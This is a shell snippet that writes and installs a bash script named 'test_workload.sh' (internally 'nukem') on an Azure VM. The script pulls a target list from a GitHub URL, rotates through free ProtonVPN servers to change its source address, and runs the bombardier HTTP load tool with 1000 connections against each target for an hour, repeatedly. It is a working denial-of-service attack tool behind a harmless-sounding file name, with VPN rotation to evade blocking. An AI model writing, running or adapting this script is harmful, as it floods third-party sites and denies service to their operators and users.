echo '#!/usr/bin/env bash

case "$1" in
        ""|*[!0-9]*)
            echo "USAGE: $0 <number_of_iterations>"
            exit 1
        ;;
esac


# BEGIN VARS
TIME_EACH="3600"  # duration for each target in seconds
PID_PATH="$BOMBARDIER_PID_PATH"
LOG_DIR="/home/azureuser/log"
LOG_PATH="$LOG_DIR/nukem.log"  # nukem run log path
LOG_RETENTION=10            # how many logs to keep
BACKUP_SUFFIX=$(date +"%F_%H%M") # log retention suffix

# NUKEM
TARG_URL="curl https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt"

NUM_RUNS=$1

# yes, Im still relying on this for free tier and server switching via cli
PROTONVPN_PATH="$(which protonvpn-cli)"
PROTONVPN_SERVERS=("JP-FREE#1"
    "JP-FREE#2"
    "JP-FREE#3"
    "JP-FREE#4"
    "NL-FREE#2"
    "NL-FREE#1"
    "NL-FREE#3"
    "NL-FREE#4"
    "NL-FREE#5"
    "NL-FREE#6"
    "NL-FREE#7"
    "NL-FREE#8"
    "NL-FREE#9"
    "NL-FREE#10"
    "NL-FREE#11"
    "US-FREE#2"
    "US-FREE#1"
    "US-FREE#3"
    "US-FREE#5"
    "US-FREE#4"
    "US-FREE#6"
    "US-FREE#7"
    "US-FREE#8"
    "US-FREE#9")
# END VARS


# BEGIN FUNCTIONS
#rotate logs
rotate_file () {
    BACKUP_FILE="$1"
    NUM_BACKUPS="$2"
    COMPONENT_NAME="$3"
    if [ -f $BACKUP_FILE ]; then
        mv -v $BACKUP_FILE ${BACKUP_FILE}${BACKUP_SUFFIX} | tee -a $LOG_PATH
    fi
    echo "$(date +"%F %H:%M:%S:%s") keeping last $NUM_BACKUPS $COMPONENT_NAME" | tee -a $LOG_PATH
    RETAIN="$(ls -tr1 ${BACKUP_FILE}* | tail -n $NUM_BACKUPS)"
    for f in ${BACKUP_FILE}* ; do
        if [ -z "$(echo $RETAIN | grep $f)" ]; then
            rm -v $f | tee -a $LOG_PATH
        fi
    done
}

# switch protonvpn server
switch_server_pvpn() {
        iteration="$1"
        pvpn_srv_num="${#PROTONVPN_SERVERS[@]}"
        if [ $iteration -lt $pvpn_srv_num ]; then
                srv_num=iteration
        else
                srv_num=$(($iteration % $pvpn_srv_num))
        fi
        echo "$(date +"%F %H:%M:%S:%s") INFO: disconnecting protonvpn from current server" | tee -a $LOG_PATH
        $PROTONVPN_PATH d | tee -a $LOG_PATH
        # sleep before re-attempting
        sleep 5s
        echo "$(date +"%F %H:%M:%S:%s") INFO: connecting protonvpn to ${PROTONVPN_SERVERS[$srv_num]}" | tee -a $LOG_PATH
        $PROTONVPN_PATH c ${PROTONVPN_SERVERS[$srv_num]}
        pstatus="$($PROTONVPN_PATH s)"
        if [ -n "$( echo $pstatus | grep -w "No active ProtonVPN connection.")" ]; then
            echo "$(date +"%F %H:%M:%S:%s") ERROR: protonvpn connection to ${PROTONVPN_SERVERS[$srv_num]} FAILED! TERMINATING IMMEDIATELY!" | tee -a $LOG_PATH
            kill_stale
            exit 1
        fi
}

# kill stale containers
kill_stale() {
    echo -e "$(date +"%F %H:%M") INFO: LOGGING STALE CONTAINERS" | tee -a $LOG_PATH
    stale_containers="$(docker ps -q)"
    if [ "$stale_containers" != "" ]; then
        echo "STALE CONTAINERS: $(echo $stale_containers | wc -l)"
        for c in $(docker ps -q); do
                echo -e "\n==== CLENAUP STALE $c ===="
                docker logs $c | tee -a $LOG_PATH 2>&1
                docker kill $c
                echo "====="
        done
    fi
}
# END FUNCTIONS

# creating new log and rotating
mkdir -p $LOG_DIR
if [ -f "$PID_PATH" ] && [ -n "$(cat $PID_PATH)" ]; then
        echo -e "$(date +"%F %H:%M") INFO: Killing old PID: $(cat PID_PATH)" | tee -a $LOG_PATH
        kill "$(cat $PID_PATH)"
fi
echo "$$" > $PID_PATH
kill_stale
rotate_file "${LOG_PATH}" $LOG_RETENTION "logs"
echo -e "==== START $(date +"%F %H:%M") ====\n" | tee -a $LOG_PATH
echo -e "$(date +"%F %H:%M") DEBUG: TIME_EACH=${TIME_EACH}s" | tee -a $LOG_PATH
echo -e "$(date +"%F %H:%M") DEBUG: NUM_RUNS=$NUM_RUNS\n" | tee -a $LOG_PATH

for run in $(seq 1 $NUM_RUNS); do
    echo -e "$(date +"%F %H:%M") INFO: BEGIN RUN $run" | tee -a $LOG_PATH
    echo -e "$(date +"%F %H:%M") INFO: RE-READ TARGETS" | tee -a $LOG_PATH
    TARGETS=()
    for t in $(curl $TARG_URL); do TARGETS+=("$t"); done
    NUM_TARGETS=${#TARGETS[@]}
    echo -e "$(date +"%F %H:%M") DEBUG: NUM_TARGETS=$NUM_TARGETS" | tee -a $LOG_PATH
    echo -e "\\n$(date +"%F %H:%M") ==== BEGIN TARGETS LIST ====" | tee -a $LOG_PATH
    for t in ${TARGETS[@]}; do echo $t | tee -a $LOG_PATH; done
    echo -e "$(date +"%F %H:%M") ==== END TARGETS LIST ====\\n" | tee -a $LOG_PATH
    # switch protonvpn server if protonvpn-cli is available
    if [ -n "$PROTONVPN_PATH" ]; then switch_server_pvpn $(($run-1)); fi
    for ran_targ in $(shuf -i 0-$(($NUM_TARGETS-1))); do
        echo -e "$(date +"%F %H:%M") INFO: RUN $run TARGET ${TARGETS[$ran_targ]}" | tee -a $LOG_PATH
        docker run -d --rm alpine/bombardier -c 1000 -d ${TIME_EACH}s -l ${TARGETS[$ran_targ]} | tee -a $LOG_PATH
        sleep ${TIME_EACH}s
        kill_stale
    done
    echo -e "$(date +"%F %H:%M") INFO: END RUN $run" | tee -a $LOG_PATH
done' > /home/azureuser/test_workload.sh

chmod +x /home/azureuser/test_workload.sh
